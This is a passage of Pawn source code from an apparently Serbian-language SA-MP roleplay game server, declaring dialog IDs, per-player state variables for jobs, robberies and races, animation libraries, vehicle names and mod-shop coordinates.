#define dialog_SERVERSTATS  	 	 		 		 		 	 	     	 194
#define dialog_SERVERSTATS_2	 	 		 		 		 	 	     	 195
#define dialog_SERVERSTATS_3	 	 		 		 		 	 	     	 196
#define dialog_SERVERSTATS_4	 	 		 		 		 	 	     	 197
#define dialog_CREATEGATE_5	 	 		 		 		 	 	     	 	 198
#define dialog_CREATEGATE_6	 	 		 		 		 	 	     	 	 199
#define dialog_CREATEGARAGE 	 		 		 		 	 	     	 	 200
#define dialog_GARAZA 	 		 		 		 	 	     	 	 		 201
#define dialog_GARAGELOCK	 		 		 		 	 	     	 	 	 202
#define dialog_ACCEPTGARAGE	 		 		 		 	 	     	 	 	 203
#define dialog_GARAGESELLDRZAVA	 		 		 		 	 	     	 	 204
#define dialog_GARAGESELLTP	 		 		 		 	 	     	 	 	 205
#define dialog_GEDIT		 		 		 	 	     	 	 	 		 206
#define dialog_GEPRICE		 		 		 	 	     	 	 	 		 207
#define dialog_GELEVEL		 		 		 	 	     	 	 	 		 208
#define dialog_CREATEGPS	 		 		 	 	     	 	 	 		 209
#define dialog_GPSEDIT	 		 		 	 	     	 	 	 		     210
#define dialog_IZMENAIMENAGPS	 		 		 	 	     	 	 	 	 211
#define dialog_IZMENAIMENAGPS2	 		 		 	 	     	 	 	 	 212
#define dialog_IZMENAPOZGPS	 		 		 	 	     	 	 	 		 213
#define dialog_CREATEAPORT 		 		 	 	     	 	 	 		     214
#define dialog_SELECTAPORT	 		 	 	     	 	 	 		     	 215
#define dialog_APORTEDIT		 	 	     	 	 	 		     	 	 216
#define dialog_IZMENAIMENAAPORT		 	 	     	 	 	 		     	 217
#define dialog_IZMENAIMENAAPORT2		 	 	     	 	 	 		   	 218
#define dialog_IZMENAPOZAPORT		 	 	     	 	 	 		     	 219
#define dialog_SELECTVPORT		 	 	     	 	 	 		     	     220
#define dialog_SPORTEDIT	 	 	     	 	 	 		     	     	 221
#define dialog_IZMENAIMENASPORT	 	 	     	 	 	 		     	     222
#define dialog_IZMENAIMENASPORT2	 	 	     	 	 	 		         223
#define dialog_IZMENAPOZSPORT	 	 	     	 	 	 		     	     224
#define dialog_CREATEJOBBUSSINES	 	 	     	 	 	 		         225
#define dialog_ORGDRUGCHOSE	 	     	 	 	 		         	    	 229
#define dialog_ORGDRUGCHOSE_2	 	     	 	 	 		         	     230
#define dialog_PRCREATE	 	     	 	 	 		         	     		 231
#define dialog_ASAMMOUNT	 	     	 	 	 		         	     	 232
#define dialog_SELECTVGUN	 	     	 	 	 		         	     	 233
#define dialog_TUNING  	 	     	 	 	 		         	     	 	 234
#define dialog_TUNING_2	 	     	 	 	 		         	     	     235
#define dialog_VVCREATE	     	 	 	 		         	     	    	 236
#define dialog_UBACIUORG_2                                                   237
#define dialog_AUTOSEDIT                                                 	 238
#define dialog_ASEDITAMMOUNT                                                 239
#define dialog_BIRAJLOKACIJU                                                 240
#define dialog_VERIFIKACIJA                                                  241
#define dialog_CCTV                                                			 242
#define dialog_RADIOPLAY                                           			 243
#define dialog_LIDER_2                                          		 	 244
#define dialog_WAR_ZAKAZI_9                                     		 	 245
#define dialog_SELECTPPORT                                     		 	     246
#define dialog_IZAZOVITRKA                                     		 	     247
#define dialog_ORGSAFE                                    		 	         248
#define dialog_ORGSAFEPUT                                    		 	     249
#define dialog_ORGSAFETAKE                                    		 	     250
#define dialog_ORGSAFETMONEY                                    		     251
#define dialog_ORGSAFETDRUG                                    		 	     252
#define dialog_ORGSAFEPMONEY                                   		 	     253
#define dialog_ORGSAFEPDRUG                                   		 	     254
#define dialog_VEHCOLOR                                   		 	     	 255
#define dialog_VEHSELLTP                                  		 	     	 256
#define dialog_ACCEPTVEH                                  		 	     	 257
#define dialog_ASKLISTA                                 		 	     	 258
#define dialog_ASKLISTA_2                                 		 	     	 259
#define dialog_RENTABLE                                		 	     		 260
#define dialog_PROPTAKEMONEY                           		 	     		 261
#define dialog_PROPPUTMONEY                           		 	     		 262
#define dialog_ZAMENA_1                          		 	     		 	 263
#define dialog_ZAMENA_2                          		 	     		 	 264
#define dialog_ZAMENA_3                          		 	     		 	 265
#define dialog_ZAMENA_4                          		 	     		 	 266
#define dialog_RCONPROVERA                      		 	     		 	 267
#define dialog_CREATERADAR                     		 	     		 	 	 268
#define dialog_UPLATITIKET                    		 	     		 	 	 269
#define dialog_UPLATITIKET_2                    		 	     		 	 270
#define dialog_UPLATITIKET_3                    		 	     		 	 271
#define dialog_UPLATITIKET_4                    		 	     		 	 272
#define dialog_DONATORBOJA                    		 	     		 	     273
#define dialog_GANGZCOLOR                   		 	     		 	     274
#define dialog_ORGCOLOR                   		 	     		 	     	 275
#define dialog_GANGZEDIT                   		 	     		 	     	 276
#define dialog_GANGZCOLOREDIT                   		 	     		 	 277
#define dialog_GANGZID                   		 	     		 	     	 278
#define DIALOG_DOSIJE 														 279
#define DIALOG_DILER 														 280
#define DIALOG_DILERHELP													 309
#define DIALOG_VOJNIKMISIJE													 313	
#define DIALOG_RENTUZMI														 315
#define dialog_Sex 															 317
#define dialog_VipImovina                                                    318
#define dialog_AdvokatPoziv                                                  319
#define dialog_IzvuciZatvorenika                                             320
#define dialog_ActorKreiraj                                                  321
#define dialog_ActorIzbrisi                                                  322
#define dialog_UlicneTrkeIgrac                                               323
#define dialog_UlicneTrkeUlog                                                324
#define dialog_UlicneTrkePoziv                                               325
#define dialog_LokalKupi                                                     326
#define dialog_GZonaVrsta                                                    327
#define dialog_UlicneTrkeVozilo                                              328
#define dialog_PlantazaKreiraj                                               329
#define dialog_MichaelMisija1                                                330
#define dialog_MichaelMisija1Prihvati                                        331
#define dialog_HangarUzmi                                                    332
#define dialog_Poslovi														 334
#define dialog_KupiDron                                                      335
#define dialog_OdaberiDron                                                   336
#define dialog_DronIsteklo                                                   337
#define dialog_DeliveryOdabir                                                338
#define dialog_Bribe                                                         339
#define dialog_BTCServer                                                     340
#define dialog_KupiMasinu                                                    341
#define dialog_BitcoinPodigni                                                342
#define dialog_BTCProdaja                                                    343
#define dialog_BTCProdajaBanka                                               344
#define dialog_BTCProdajaBankaPotvrdi                                        345
#define dialog_BTCProdajaBlack                                               346
#define dialog_BTCProdajaBlackPotvrdi                                        347
#define dialog_GranicaPretres                                                348
#define dialog_Muzika                                                        349
#define dialog_OrgVoziloUzmi                                                 350
#define dialog_NapraviOrgVehPickup                                           351
#define dialog_NapraviOrgVehPickupModel                                      352
#define dialog_OrgVoziloUpgrade                                              353
#define dialog_OrgVehEdit                                                    354
#define dialog_OrgVehEditOwner                                               355
#define dialog_OrgVehEditKolicina                                            356
#define dialog_OrgVehEditModel                                               357
#define dialog_OrgVehEditSpawn                                               358
#define dialog_WAR                                                           359
#define dialog_WAR_CREATE_1                                                  360
#define dialog_WAR_CREATE_2                                                  361
#define dialog_WAR_CREATE_3                                                  362
#define dialog_WAR_CREATE_4                                                  363
#define dialog_WAR_CREATE_5                                                  364
#define dialog_WAR_CREATE_6                                                  365
#define dialog_WAR_CREATE_7                                                  366
#define dialog_WAR_CREATE_8                                                  367
#define dialog_WARINVITE                                                     368
#define dialog_WARUNINVITE                                                   369
#define dialog_OrgVehEditKolicina_2                                          370
#define dialog_OrgVehEditModel_2                                             371
#define dialog_WorkShop                                                      372
#define dialog_WorkShopBuyCar                                                373
#define dialog_WorkShopBuyPart                                               374
#define dialog_WorkShopSellCar                                               375
#define dialog_WorkShopSellCarAccept                                         376
#define dialog_WorkShopBuyWork                                               377
#define dialog_Misije                                                        378
#define dialog_Cipovanje                                                     379
#define dialog_WorkShopSell                                                  380
#define dialog_BitcoinSell                                                   381
#define dialog_HackingSifra                                                  382
#define dialog_Deonice                                                       383
#define dialog_DeoniceSell                                                   384
#define dialog_DeoniceBuy                                                    385
#define dialog_Withdraw                                                      386
#define dialog_Deposit                                                       387
#define dialog_Transfer                                                      388
#define dialog_Achivements1                                                  389
#define dialog_Achivements2                                                  390
#define dialog_MakeGun                                                       391
#define dialog_SERVERSTATS_5                                                 392
#define dialog_FirmaSetJob                                                   393
#define dialog_NargilaRent                                                   394
#define dialog_AutoPilot                                                     395
#define dialog_KazniID                                                       396
#define dialog_Kazni                                                         397
#define dialog_AVeh                                                          398
#define dialog_SahteOdabir                                                   399
#define dialog_Mehanicar                                                     400
#define dialog_SKIN                                                          401
#define dialog_NapraviOrgVehPickupColor                                      402
#define dialog_IzmeniOrgVehPickupColor                                       403
#define dialog_HVeh                                                          404
#define dialog_UpgradeSkill                                                  405
#define dialog_portVrsta                                                     407
#define dialog_selectPort                                                    408
#define dialog_portCreateIme                                                 409
#define dialog_portCreateVrsta                                               410
#define dialog_selectPortOrg                                                 411
#define dialog_SelectJob                                                     412
#define dialog_passwordChange                                                413
#define dialog_hostnameChange                                                414
#define dialog_BitcoinSellPlayer                                             415
#define dialog_BitcoinSellPlayerAccept                                       416
#define dialog_Savez                                                         417
#define dialog_SavezPrihvati                                                 418
#define dialog_WPanel                                                        419
#define dialog_VPVeh                                                         420
#define dialog_ORGSAFETMATS                                                  421
#define dialog_ORGSAFEPMATS                                                  422
#define dialog_platePoslova                                                  423
#define dialog_platePoslovaPlata                                             424
#define dialog_RadionicaEdit                                                 425
#define dialog_BitcoinEdit                                                   426
#define dialog_selectGPS                                                     427
#define dialog_Slut                                                          428
#define dialog_NaftaEdit                                                     429
#define dialog_NaftaPodigni                                                  430
#define dialog_NaftaSell                                                     431
#define dialog_NaftaSellPlayerAccept                                         432
#define dialog_NaftaSellPlayer                                               433
#define dialog_Nafta                                                         434
#define dialog_Stats                                                         435
#define dialog_Stats_2                                                       436
#define dialog_Inventory                                                     437
#define dialog_SLABATACKA                                                    438
#define dialog_RanacIzvadiMetkovi                                            439
#define dialog_Sistemi                                                       440
#define dialog_StatsCheck                                                    441
#define dialog_Stats_2Check                                                  442
#define dialog_InventoryCheck                                                443
#define dialog_PolicijaTest1                                                 444
#define dialog_PolicijaTest2                                                 445
#define dialog_PolicijaTest3                                                 446
#define dialog_PolicijaTest4                                                 447
#define dialog_PolicijaTest5                                                 448
#define dialog_PolicijaTest6                                                 449
#define dialog_PolicijaTest7                                                 450
#define dialog_PolicijaTest8                                                 451
#define dialog_PolicijaTest9                                                 452
#define dialog_RadionicaSellPlayer                                           453  
#define dialog_RadionicaSellPlayerAccept                                     454
//==============================[ Newovi ]======================================
//------------------------------------------------------------------------------
//------------------------------------------------------------------------------
//------------------------------------------------------------------------------
new bool:realchat 				 = true,
	timeshift                    = 0,
	ghour                        = 0,
	gminute                      = 0,
    gsecond                      = 0,
    levelexp                     = 6,
    smscost                      = 1,
    cchargetime                  = 60,
    Medics                       = 0,
    callcost                     = 4,
	bool:realtime                = true,
	wtime                        = 12,
	addtimer                     = 120000,
	bool:adds                    = true,
	bool:ToggedG                 = true,
	//TimerBankeVracanje,
	shifthour,
	carspawntimer;
new DialogStrgEx[ 2048 ],
    RealName[ MAX_PLAYERS ][ MAX_PLAYER_NAME ],
	globalstring[ 128 ];
// new newsbre = 1,
// 	newstimer = 10000;
new bool:RiotShield[ MAX_PLAYERS ],
    bool:UzeoPicu[ MAX_PLAYERS ],
    bool:electricNACP[ MAX_PLAYERS ],
	bool:PoliceDuty[ MAX_PLAYERS ];
new lastweapon[ MAX_PLAYERS ][ 2 ];
new ReportGlobal[ MAX_PLAYERS ],
    BusLinija[ MAX_PLAYERS ],
    BusVozac[ MAX_PLAYERS ],
    VIPPort[ MAX_PLAYERS ],
    PromoterPort[ MAX_PLAYERS ],
	PlacaPorez[ MAX_PLAYERS ],
	NewGlobal[ MAX_PLAYERS ],
	PomocGlobal[ MAX_PLAYERS ];
new Training[ MAX_PLAYERS ];
new bool:PlayerLogged[ MAX_PLAYERS ];
new EditKontejnera[ MAX_PLAYERS ],
    EditRadar[ MAX_PLAYERS ],
	EditATM[ MAX_PLAYERS ];
new cistackilometri[ MAX_PLAYERS ],
    ChosenJob[ MAX_PLAYERS ],
    LetSF[ MAX_PLAYERS ],
    PilotTimer[ MAX_PLAYERS ],
    FarbanjeTimer[ MAX_PLAYERS ],
    LetLV[ MAX_PLAYERS ],
	CistacTimer[ MAX_PLAYERS ],
	bool:CistacPosao[ MAX_PLAYERS ],
	Float:cistacpoz[ MAX_PLAYERS ][ 3 ],
	cistacnovac[ MAX_PLAYERS ],
	CistacWarning[ MAX_PLAYERS ],
	cistacvozilo[ MAX_PLAYERS ],
	cistacmetri[ MAX_PLAYERS ];
new VremeZaNovac[ MAX_PLAYERS ],
	VremeZaZlato[ MAX_PLAYERS ],
    CheckpointStatus[ MAX_PLAYERS ],
    ZlatoVreme[ MAX_PLAYERS ],
    PljackanjeZlatareTimer[ MAX_PLAYERS ],
    PljackaZlato[ MAX_PLAYERS ],
    PljackanjeBankeTimer[ MAX_PLAYERS ],
	PljackaVreme[ MAX_PLAYERS ],
	PljackaNovac[ MAX_PLAYERS ];

new Sex_Lisa, bool:WhoreLisa,
	Sex_Angelina, bool:WhoreAngelina,
	Sex_Mia, bool:WhoreMia,
	Sex_Sendy, bool:WhoreSendy;

new IzabraniParovi1[ 10 ], IzabraniParovi2[ 10 ];

new bool:ListaPrikazana[ MAX_PLAYERS ],
    bool:RezultatiPrikazana[ MAX_PLAYERS ],
    bool:MojListicPrikazan[ MAX_PLAYERS ];


new Float:Degree[ MAX_PLAYERS ];
const Float: SelfieRadius = 1.4;
const Float: SelfieSpeed  = 1.25;
const Float: SelfieHeight = 1.0;
new Float:lX[ MAX_PLAYERS ];
new Float:lY[ MAX_PLAYERS ];
new Float:lZ[ MAX_PLAYERS ];


new Seeds[ MAX_PLAYERS ],
    bool:takingselfie[ MAX_PLAYERS ],
    PlayerInBlowJob[ MAX_PLAYERS ],
    BlowJobCount[ MAX_PLAYERS ],
    PlayerText:BLOWJOBCOVER[ MAX_PLAYERS ][ 5 ],
    PusenjeTimer[ MAX_PLAYERS ],
    IzabraniAskQ[ MAX_PLAYERS ],
    Timer_Fading[ MAX_PLAYERS ],
    Polaganje[ MAX_PLAYERS ],
    PlayerCement[ MAX_PLAYERS ],
    F_Count[ MAX_PLAYERS ],
    DropedGun[ MAX_PLAYERS ],
    BrojLisica[ MAX_PLAYERS ],
    TazerMetkovi[ MAX_PLAYERS ],
	FakeKillPlus[ MAX_PLAYERS ],
	FakeKillTime[ MAX_PLAYERS ],
    PoljeDroge[ MAX_PLAYERS ],
    Poravnano[ MAX_PLAYERS ],
    WatchModel[ MAX_PLAYERS ],
    ChosenItem[ MAX_PLAYERS ],
    GiveItemID[ MAX_PLAYERS ],
    AdminVozilo[ MAX_PLAYERS ],
    TrkaVozilo[ MAX_PLAYERS ],
    IzazivanjeTimer[ MAX_PLAYERS ],
    Krugovi[ MAX_PLAYERS ],
    TrkaCheckpoint[ MAX_PLAYERS ],
	TrkaIzazov[ MAX_PLAYERS ],
	bool:NaDmEventu[ MAX_PLAYERS ],
	bool:NaUtrci[ MAX_PLAYERS ],
    bool:ShowedRegister[ MAX_PLAYERS ],
    ResprayColor1[ MAX_PLAYERS ],
	ResprayColor2[ MAX_PLAYERS ],
	DragedPlayerID[ MAX_PLAYERS ],
	Draged[ MAX_PLAYERS ],
	DragTimer[ MAX_PLAYERS ],
    ShowedAtmTD[ MAX_PLAYERS ],
    gpsid[ MAX_PLAYERS ],
    EnteredGarage[ MAX_PLAYERS ],
    ServerStatsChose[ MAX_PLAYERS ],
    bool:PraznaGajbica[ MAX_PLAYERS ],
    bool:ImaKanticu[ MAX_PLAYERS ],
	GajbicaBiljka[ MAX_PLAYERS ],
    bool:ElectricOprema[ MAX_PLAYERS ],
    BrojilaKuca[ MAX_PLAYERS ],
	EIDK[ MAX_PLAYERS ],
    ElectricPosao[ MAX_PLAYERS ],
    Bandera[ MAX_PLAYERS ],
    bool:MedicDuty[ MAX_PLAYERS ],
    backuptimer[ MAX_PLAYERS ],
    SeedsK[ MAX_PLAYERS ];
new skinlist = mS_INVALID_LISTID; // Buy skins

new OdabraniSkin[MAX_PLAYERS];
new bool:OdabraoSex[MAX_PLAYERS];
new bool:InputPassword[ MAX_PLAYERS ],
	bool:ChoseCountry[ MAX_PLAYERS ],
	bool:InputAge[ MAX_PLAYERS ],
	bool:InputMail[ MAX_PLAYERS ],
    bool:OdabraoSkin[MAX_PLAYERS],
	RegSex[ MAX_PLAYERS ],
	BiraSkin[ MAX_PLAYERS ],
	BiraPol[ MAX_PLAYERS ];
new GlobalProdaja[ MAX_PLAYERS ],
    Ponudjeno[ MAX_PLAYERS ],
	Trazio[ MAX_PLAYERS ],
	GlobalCena[ MAX_PLAYERS ],
	GlobalID_2[ MAX_PLAYERS ],
	GlobalID[ MAX_PLAYERS ];
new Spectate[ MAX_PLAYERS ];
new MarriageCeremoney[ MAX_PLAYERS char ];
new ProposeOffer[ MAX_PLAYERS ],
	DivorceOffer[ MAX_PLAYERS ];
new ProposedTo[ MAX_PLAYERS ];
new GotProposedBy[ MAX_PLAYERS ];
new MarryWitness[ MAX_PLAYERS ];
new MarryWitnessOffer[ MAX_PLAYERS ];
new WatchingTV[MAX_PLAYERS char];
new bool:AdminDuty[ MAX_PLAYERS ],
    MinutiIgraca[ MAX_PLAYERS ],
    IgracPosadio[ MAX_PLAYERS ],
    VremeZaCuvanje[ MAX_PLAYERS ],
    IzabraniPort[ MAX_PLAYERS ],
    ChosenVehicle[ MAX_PLAYERS ],
    KreiranAutoSalon[ MAX_PLAYERS ],
    KreiraGarazu[ MAX_PLAYERS ],
	bool:PlayerCPShow[ MAX_PLAYERS ],
    PhoneOnline[ MAX_PLAYERS ],
    Float:SpecPos[ MAX_PLAYERS ][ 3 ],
	SpecVW[ MAX_PLAYERS ],
	SpecInt[ MAX_PLAYERS ],
    anticheatinfo[ MAX_PLAYERS ],
	RPTeacherDuty[ MAX_PLAYERS ];
new InAmbu[ MAX_PLAYERS ];
new bool:TelohraniteljUniforma[ MAX_PLAYERS ],
	bool:VozacUniforma[ MAX_PLAYERS ];
new TrashLimit[ MAX_PLAYERS ],
	TrashTimer[ MAX_PLAYERS ],
   	TrashSearch[ MAX_PLAYERS ];
new bool:NosiObjekt[ MAX_PLAYERS ][ 3 ];
new PropertySafeGun[ MAX_PLAYERS ];
new PaketType[ MAX_PLAYERS ],
    Trafika[ MAX_PLAYERS ],
	bool:NosiPaketOruzja[ MAX_PLAYERS ];
new TimerLearn[ MAX_PLAYERS ];
new TimerTutorial[ MAX_PLAYERS ];
new TimerPitanje[ MAX_PLAYERS ];
new BolnicaTimer[ MAX_PLAYERS ];
new 
	gradjkapija,
	promkapija,
	vipkapija;

new bool:PromoterskaKapija;
new ChosenProperty[ MAX_PLAYERS ];
new cseconds, cstring[40];
new PitanjeBroj[ MAX_PLAYERS ],
  	TacanOdgovor[ MAX_PLAYERS ],
  	//PokusajiHakedovanja[ MAX_PLAYERS ],
	//HakovanjeTimer[ MAX_PLAYERS ],
	KupljenGPS[MAX_PLAYERS ],
	bool:PozvaoTaxi[ MAX_PLAYERS ],
	Rentano[ MAX_PLAYERS ],
	CenaVoznje[ MAX_PLAYERS ],
    bool:taxiDuty[ MAX_PLAYERS ],
	bool:TaximetarUkljucen[ MAX_PLAYERS ],
	VoziIgracaID[ MAX_PLAYERS ],
	offeredByCabbie[ MAX_PLAYERS ],
	TrunkVehicle[ MAX_PLAYERS ],
	TazerTimer[ MAX_PLAYERS ],
	TaxiTimer[ MAX_PLAYERS ],
	PlayerCuffed[ MAX_PLAYERS ],
	PosaoRudar[ MAX_PLAYERS ],
	bool:PlayerDrugged[ MAX_PLAYERS ],
	bool:PlayerStoned[ MAX_PLAYERS ],
	bool:PosaoTDShowed[ MAX_PLAYERS ],
	bool:PlayerTuningCar[ MAX_PLAYERS ],
    bool:StatsTDShowed[ MAX_PLAYERS ],
    bool:BuyCarTDShowed[ MAX_PLAYERS ],
	bool:IgracSeRegistruje[ MAX_PLAYERS ],
	bool:PocetniTutorialStartovan[ MAX_PLAYERS ],
	bool:LaptopRuke[ MAX_PLAYERS ],
	bool:VecjeUsao[ MAX_PLAYERS ],
	bool:Dinamit[ MAX_PLAYERS ],
	bool:PuniGorivo[ MAX_PLAYERS ],
	ProcesPice[ MAX_PLAYERS ],
	PlayerCode[ MAX_PLAYERS ],
	bool:TogHud[ MAX_PLAYERS ],
	bool:IgracZavezan[ MAX_PLAYERS ],
	bool:AccountVerified[ MAX_PLAYERS ],
	bool:KnockedDown[ MAX_PLAYERS ],
	bool:IgracOpljackan[ MAX_PLAYERS ],
	bool:Pojas[ MAX_PLAYERS ],
	bool:Uze[ MAX_PLAYERS ],
	bool:Maskuse[ MAX_PLAYERS ],
	bool:FlyMode[ MAX_PLAYERS ],
	SearchNadji[ MAX_PLAYERS ],
	bool:ImaTazer[ MAX_PLAYERS ];

new gNews[ MAX_PLAYERS char ];
new VrstaIlegala[ MAX_PLAYERS ],
	KolicinaIlegala[ MAX_PLAYERS ];
new Odbrojavanje[ MAX_PLAYERS ];
new bool:Uciskolu[ MAX_PLAYERS ],
    RentTimer[ MAX_PLAYERS ],
	SkolaTimer[ MAX_PLAYERS ];
new bool:UzeoOpremu[ MAX_PLAYERS ];
new Grass[38][ MAX_PLAYERS ],
	GrassID[38][ MAX_PLAYERS ],
	TravaTimer[ MAX_PLAYERS ],
	bool:KrenuoKosenje[ MAX_PLAYERS ],
	PokosenaTrava[ MAX_PLAYERS ],
    kosacVozilo[MAX_PLAYERS],
    glenParkZona;
new PolaganjeBodovi[ MAX_PLAYERS ],
	StaroVreme[ MAX_PLAYERS ],
    NovoVreme[ MAX_PLAYERS ];
new GreskaVoznja[ MAX_PLAYERS ];
new ListaBurg[ MAX_PLAYERS ];
new bool:FaceOn[ MAX_PLAYERS ],
	bool:HeadOn[ MAX_PLAYERS ],
	bool:HelmetOn[ MAX_PLAYERS ],
	bool:SungOn[ MAX_PLAYERS ];
new PonudioIgrac[ MAX_PLAYERS ];
new ModelTrke[ MAX_PLAYERS ];
new UlogTrke[ MAX_PLAYERS ];
new inProperty[ MAX_PLAYERS ],
    inOrgInt[ MAX_PLAYERS ],
    inHotel[ MAX_PLAYERS ],
    uInterijeru[ MAX_PLAYERS ],
	uFirmi[ MAX_PLAYERS ];
new CenaProdaje[ MAX_PLAYERS ];
new EditingBody[ MAX_PLAYERS ];
new RadioAktiviran[ MAX_PLAYERS ];
new UsaoAutoProdaja[ MAX_PLAYERS ];
new PrviSpawn[ MAX_PLAYERS ];
new OrgKreiranje[ MAX_PLAYERS ];
new PokusajLogina[ MAX_PLAYERS ];

static const g_aPreloadLibs[134][13] = {
	"AIRPORT",      "ATTRACTORS",   "BAR",          "BASEBALL",     "BD_FIRE",
	"BEACH",        "BENCHPRESS",   "BF_INJECTION", "BIKE_DBZ",     "BIKED",
	"BIKEH",        "BIKELEAP",     "BIKES",        "BIKEV",        "BLOWJOBZ",
	"BMX",          "BOMBER",       "BOX",          "BSKTBALL",     "BUDDY",
	"BUS",          "CAMERA",       "CAR",          "CAR_CHAT",     "CARRY",
	"CASINO",       "CHAINSAW",     "CHOPPA",       "CLOTHES",      "COACH",
	"COLT45",       "COP_AMBIENT",  "COP_DVBYZ",    "CRACK",        "CRIB",
	"DAM_JUMP",     "DANCING",      "DEALER",       "DILDO",        "DODGE",
	"DOZER",        "DRIVEBYS",     "FAT",          "FIGHT_B",      "FIGHT_C",
	"FIGHT_D",      "FIGHT_E",      "FINALE",       "FINALE2",      "FLAME",
	"FLOWERS",      "FOOD",         "FREEWEIGHTS",  "GANGS",        "GFUNK",
	"GHANDS",       "GHETTO_DB",    "GOGGLES",      "GRAFFITI",     "GRAVEYARD",
	"GRENADE",      "GYMNASIUM",    "HAIRCUTS",     "HEIST9",       "INT_HOUSE",
	"INT_OFFICE",   "INT_SHOP",     "JST_BUISNESS", "KART",         "KISSING",
	"KNIFE",        "LAPDAN1",      "LAPDAN2",      "LAPDAN3",      "LOWRIDER",
	"MD_CHASE",     "MD_END",       "MEDIC",        "MISC",         "MTB",
	"MUSCULAR",     "NEVADA",       "ON_LOOKERS",   "OTB",          "PARACHUTE",
	"PARK",         "PAULNMAC",     "PED",          "PLAYER_DVBYS", "PLAYIDLES",
	"POLICE",       "POOL",         "POOR",         "PYTHON",       "QUAD",
	"QUAD_DBZ",     "RAPPING",      "RIFLE",        "RIOT",         "ROB_BANK",
	"ROCKET",       "RUNNINGMAN",   "RUSTLER",      "RYDER",        "SCRATCHING",
	"SEX",          "SHAMAL",       "SHOP",         "SHOTGUN",      "SILENCED",
	"SKATE",        "SMOKING",      "SNIPER",       "SNM",          "SPRAYCAN",
	"STRIP",        "SUNBATHE",     "SWAT",         "SWEET",        "SWIM",
	"SWORD",        "TANK",         "TATTOOS",      "TEC",          "TRAIN",
	"TRUCK",        "UZI",          "VAN",          "VENDING",      "VORTEX",
	"WAYFARER",     "WEAPONS",      "WOP",          "WUZI"
};

new ZabranjeneReci[][] = {
    "http://","https://"
};

new ImeVozila[212][20] = {
    	"Landstalker", "Bravura", "Buffalo", "Linerunner", "Perrenial", "Sentinel",
        "Dumper", "Firetruck", "Trashmaster", "Stretch", "Manana", "Infernus",
        "Voodoo", "Pony", "Mule", "Cheetah", "Ambulance", "Leviathan", "Moonbeam",
    	"Esperanto", "Taxi", "Washington", "Bobcat", "Whoopee", "BF Injection",
        "Hunter", "Premier", "Enforcer", "Securicar", "Banshee", "Predator", "Bus",
        "Rhino", "Barracks", "Hotknife", "Trailer", "Previon", "Coach", "Cabbie",
        "Stallion", "Rumpo", "RC Bandit", "Romero", "Packer", "Monster", "Admiral",
        "Squalo", "Seasparrow", "Pizzaboy", "Tram", "Trailer", "Turismo", "Speeder",
        "Reefer", "Tropic", "Flatbed", "Yankee", "Caddy", "Solair", "Berkley's RC Van",
        "Skimmer", "PCJ-600", "Faggio", "Freeway", "RC Baron", "RC Raider", "Glendale",
        "Oceanic","Sanchez", "Sparrow", "Patriot", "Quad", "Coastguard", "Dinghy",
        "Hermes", "Sabre", "Rustler", "ZR-350", "Walton", "Regina", "Comet", "BMX",
        "Burrito", "Camper", "Marquis", "Baggage", "Dozer", "Maverick", "News Chopper",
        "Rancher", "FBI Rancher", "Virgo", "Greenwood", "Jetmax", "Hotring", "Sandking",
        "Blista Compact", "Police Maverick", "Boxvillde", "Benson", "Mesa", "RC Goblin",
        "Hotring Racer A", "Hotring Racer B", "Bloodring Banger", "Rancher", "Super GT",
        "Elegant", "Journey", "Bike", "Mountain Bike", "Beagle", "Cropduster", "Stunt",
        "Tanker", "Roadtrain", "Nebula", "Majestic", "Buccaneer", "Shamal", "Hydra",
        "FCR-900", "NRG-500", "HPV1000", "Cement Truck", "Tow Truck", "Fortune",
        "Cadrona", "FBI Truck", "Willard", "Forklift", "Tractor", "Combine", "Feltzer",
        "Remington", "Slamvan", "Blade", "Freight", "Streak", "Vortex", "Vincent",
		"Bullet", "Clover", "Sadler", "Firetruck", "Hustler", "Intruder", "Primo",
        "Cargobob", "Tampa", "Sunrise", "Merit", "Utility", "Nevada", "Yosemite",
        "Windsor", "Monster", "Monster", "Uranus", "Jester", "Sultan", "Stratum",
        "Elegy", "Raindance", "RC Tiger", "Flash", "Tahoma", "Savanna", "Bandito",
    	"Freight Flat", "Streak Carriage", "Kart", "Mower", "Dune", "Sweeper",
        "Broadway", "Tornado", "AT-400", "DFT-30", "Huntley", "Stafford", "BF-400",
        "News Van", "Tug", "Trailer", "Emperor", "Wayfarer", "Euros", "Hotdog", "Club",
        "Freight Box", "Trailer", "Andromada", "Dodo", "RC Cam", "Launch", "Police Car",
        "Police Car", "Police Car", "Police Ranger", "Picador", "S.W.A.T", "Alpha",
        "Phoenix", "Glendale", "Sadler", "Luggage", "Luggage", "Stairs", "Boxville",
        "Tiller", "Utility Trailer"
};

new Float:CheatPositions[ 46 ][ 3 ]= {
	{-1935.77, 228.79, 34.16},//Transfender near Wang Cars in Doherty
	{-2707.48, 218.65, 4.93},//Wheel Archangels in Ocean Flats
	{2645.61,-2029.15,14.28},//LowRider Tuning Garage in Willowfield
	{1041.26,-1036.77,32.48},//Transfender in Temple
	{2387.55,1035.70,11.56},//Transfender in come-a-lot
	{1836.93,-1856.28,14.13},//Eight Ball Autos near El Corona
	{2006.11,2292.87,11.57},//Welding Wedding Bomb-workshop in Emerald Isle
	{-1787.25,1202.00,25.84},//Michelles Pay 'n' Spray in Downtown
	{720.10,-470.93,17.07},//Pay 'n' Spray in Dillimore
	{-1420.21,2599.45,56.43},//Pay 'n' Spray in El Quebrados
	{-100.16,1100.79,20.34},//Pay 'n' Spray in Fort Carson
	{2078.44,-1831.44,14.13},//Pay 'n' Spray in Idlewood
	{-2426.89,1036.61,51.14},//Pay 'n' Spray in Juniper Hollow
	{1957.96,2161.96,11.56},//Pay 'n' Spray in Redsands East
	{488.29,-1724.85,12.01},//Pay 'n' Spray in Santa Maria Beach
	{1025.08,-1037.28,32.28},//Pay 'n' Spray in Temple
	{2393.70,1472.80,11.42},//Pay 'n' Spray near Royal Casino
	{-1904.97,268.51,41.04},//Pay 'n' Spray near Wang Cars in Doherty
	{403.58,2486.33,17.23},//Player Garage: Verdant Meadows
	{1578.24,1245.20,11.57},//Player Garage: Las Venturas Airport
	{-2105.79,905.11,77.07},//Player Garage: Calton Heights
	{423.69,2545.99,17.07},//Player Garage: Derdant Meadows
	{785.79,-513.12,17.44},//Player Garage: Dillimore
	{-2027.34,141.02,29.57},//Player Garage: Doherty
	{1698.10,-2095.88,14.29},//Player Garage: El Corona
	{-361.10,1185.23,20.49},//Player Garage: Fort Carson
	{-2463.27,-124.86,26.41},//Player Garage: Hashbury
	{2505.64,-1683.72,14.25},//Player Garage: Johnson House
	{1350.76,-615.56,109.88},//Player Garage: Mulholland
	{2231.64,156.93,27.63},//Player Garage: Palomino Creek
